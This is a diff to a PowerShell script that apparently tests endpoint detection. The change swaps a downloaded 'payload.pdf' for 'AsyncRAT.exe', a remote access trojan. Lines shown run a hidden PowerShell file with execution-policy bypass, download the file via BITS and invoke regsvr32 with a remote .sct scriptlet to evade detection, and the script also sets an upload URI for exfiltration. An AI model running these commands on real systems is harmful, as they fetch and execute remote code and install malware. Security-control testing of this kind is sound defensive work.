@@ -2,7 +2,7 @@
 $FolderName = "C:\tpp\"
 $ExfiltrateFolder = "exfiltrate"
 $HiddenPSFileName = "evil.ps1"
-$EvilPDF = "payload.pdf"
+$EvilEXE = "AsyncRAT.exe"
 $EvilSCT = "payload.sct"
 $UploadURI = ($TPPSecurityTestSite + "upload.php")
 $username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
@@ -39,7 +39,7 @@ else
 ("powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -file " + ($FolderName + $HiddenPSFileName)) | cmd
 
 #Check for downloading a bad hash
-Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilPDF) -Destination ($FolderName + $EvilPDF) -Asynchronous
+Start-BitsTransfer -Source ($TPPSecurityTestSite + $EvilEXE) -Destination ($FolderName + $EvilEXE) -Asynchronous
 
 #Check for RegSvr32 detection evasion
 "regsvr32.exe /s /u /i:" + ($TPPSecurityTestSite + $EvilSCT) + " scrobj.dll" | cmd
